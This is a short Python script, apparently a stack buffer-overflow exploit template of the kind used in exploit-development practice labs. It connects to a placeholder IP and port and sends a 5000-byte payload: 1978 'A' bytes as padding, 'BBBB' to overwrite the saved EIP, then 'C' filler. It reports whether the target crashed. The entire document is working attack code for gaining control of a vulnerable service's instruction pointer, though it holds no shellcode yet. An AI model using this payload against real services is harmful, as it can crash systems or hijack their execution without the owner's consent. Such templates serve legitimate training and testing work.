#! /usr/bin/env python3 

import socket

ip = "<IP>"
port = <PORT>


prefix = b""
length = 5000
offset = 1978
new_eip = b"BBBB"

payload = prefix + b"A"*offset + new_eip +b"C"* (length - len(new_eip) - offset)

try: 
    with socket.socket() as s:
        s.connect((ip,port))
        s.send(payload)
        print ("[+] " + str(len(payload)-len(prefix)) + " Bytes Sent")
except:
    print ("[-] Crashed")